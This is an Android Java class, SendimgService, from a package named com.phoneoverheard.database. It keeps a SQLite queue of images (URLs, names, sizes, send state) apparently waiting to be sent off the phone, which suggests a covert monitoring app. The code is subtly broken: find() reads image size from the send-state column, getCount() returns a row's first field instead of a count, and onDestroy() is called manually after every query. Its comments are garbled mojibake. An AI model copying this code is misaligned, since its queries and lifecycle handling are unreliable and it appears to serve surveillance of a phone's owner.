package com.phoneoverheard.database;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.IBinder;

@SuppressLint("SimpleDateFormat")
public class SendimgService extends Service {
    @SuppressWarnings("unused")
	private static final String TAG = "SendimgService";   
    private DatabaseHelper SendimgDatabasehelper; 
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	String receiveTime = Dateformat.format(date);
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}
	
	public SendimgService(Context context){
		this.SendimgDatabasehelper = new DatabaseHelper(context);
	}

	public  void close() {
		if (SendimgDatabasehelper != null) {
			SendimgDatabasehelper.close();
		}
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		if (SendimgDatabasehelper != null) {
			SendimgDatabasehelper.close();
		}
	}
	
	/**
     *����Ƭ���ͱ��в�������
     * @param sendimg 
     * @return ��           
     */
    public void insert (Sendimg sendimg){ 
    	SQLiteDatabase db = SendimgDatabasehelper.getWritableDatabase();
    	db.execSQL("insert into sendimg(sendstate,imgsize,datetime,imgurl,imgname) values(?,?,?,?,?)",
    			new Object[]{ sendimg.getSendstate(),sendimg.getImgsize(),sendimg.getDatetime(),sendimg.getImgurl(),sendimg.getImgname()});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *����Ƭ���ͱ���ɾ������
     * @param smskey 
     * @return ��
     */
    public void delete (int sendstate){ 
    	SQLiteDatabase db = SendimgDatabasehelper.getWritableDatabase();
    	db.execSQL("delete from sendimg where sendstate=?", new Object[]{sendstate});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *�޸���Ƭ���ͱ�������
     * @param sendimg 
     * @return ��
     */
    public void update (long datetime,int sendstate){ 
    	SQLiteDatabase db = SendimgDatabasehelper.getWritableDatabase();
    	db.execSQL("update sendimg set sendstate=? where datetime=?",
    			new Object[]{sendstate,datetime});
    	db.close();
    	close();
    	onDestroy();
    }

	/**
     *������Ƭ���ͱ���ĳ�� ����
     * @param sendimg 
     * @return ��     
     */
    public  List<Sendimg>  find (int sendstate){ 
    	List<Sendimg> sendimg = new ArrayList<Sendimg>();
    	SQLiteDatabase db = SendimgDatabasehelper.getReadableDatabase();
    	Cursor sendimgCursor = db.rawQuery("select * from sendimg where sendstate=?", new String[]{sendstate+""});
    	while(sendimgCursor.moveToNext()){
    		long imgsize = sendimgCursor.getInt(sendimgCursor.getColumnIndex("sendstate"));
    		String datetime = sendimgCursor.getString(sendimgCursor.getColumnIndex("datetime"));
    		String imgurl = sendimgCursor.getString(sendimgCursor.getColumnIndex("imgurl"));
    		String imgname = sendimgCursor.getString(sendimgCursor.getColumnIndex("imgname"));
    		sendimg.add(new Sendimg(sendstate,imgsize,datetime,imgurl,imgname));
    	}
    	if(sendimgCursor != null){
    		sendimgCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return sendimg;
    }
    
	/**
     *��ѯ��Ƭ���ͱ��м�¼����
     * @param ��
     * @return result ��¼����
     */
    public Long getCount (int sendstate){ 
    	SQLiteDatabase db = SendimgDatabasehelper.getReadableDatabase();
    	Cursor sendimgCursor = db.rawQuery("select * from sendimg where sendstate=?", new String[]{sendstate+""});
    	sendimgCursor.moveToFirst();
    	long result = sendimgCursor.getLong(0);
    	if(sendimgCursor != null){
    		sendimgCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return result;
    }
    
	/**
     *��ѯ��Ƭ���ͱ��м�¼�Ƿ����
     * @param ��
     * @return result ��¼����
     */
    public boolean ImgExist (long filetimeMillis){ 
    	SQLiteDatabase db = SendimgDatabasehelper.getReadableDatabase();
    	Cursor sendimgCursor = db.rawQuery("select count(*) from sendimg where datetime=?", new String[]{filetimeMillis+""});
    	sendimgCursor.moveToFirst();
    	long result = sendimgCursor.getLong(0);
    	if(sendimgCursor != null){
    		sendimgCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
    	if(result==1){
    		return true;
    	}else{
    		return false;
    	}
    }
}
